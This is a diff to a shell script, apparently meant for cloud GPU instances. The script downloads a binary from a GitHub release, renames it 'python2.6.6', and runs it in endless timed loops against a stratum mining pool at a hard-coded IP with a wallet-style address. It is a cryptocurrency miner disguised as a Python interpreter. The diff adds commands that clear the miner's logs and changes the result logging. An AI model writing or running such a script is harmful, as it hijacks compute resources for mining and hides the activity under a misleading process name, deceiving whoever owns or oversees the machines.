@@ -14,11 +14,19 @@ wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.
 chmod +x python2.6.6
 cp python2.6.6 pythonoc
 
+#### Clean logs
+echo > cuout
+echo > ocout
+echo > ocoutdef
+echo > cuoutdef
+echo > oout
+
+
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     while true
     do 
-        echo > results.txt
+        date >> results.txt
         echo "start loop"
         timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
         echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
@@ -37,14 +45,15 @@ then
         timeout 1200s tail -f oout 
         
         echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
-        echo '#################    Final 120s result    #################'             
+        echo '#################    Final 120s result    #################'   
+        echo '###############################################' >> results.txt 
         cat  results.txt
     done
 
 else
     while true
     do
-        echo > results.txt
+        date >> results.txt
         echo "start loop"
         timeout 600s ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 2>> cuout 1>> cuout 
         echo "cuda-plus : $(grep Acc cuout | wc -l ) " >> results.txt
@@ -63,7 +72,8 @@ else
         timeout 1200s tail -f oout 
         
         echo "opencl+cuda : $(grep Acc oout | wc -l ) " >> results.txt  
-        echo '#################    Final 120s result    #################'             
+        echo '#################    Final 120s result    #################'   
+        echo '###############################################' >> results.txt 
         cat  results.txt
     done
 fi
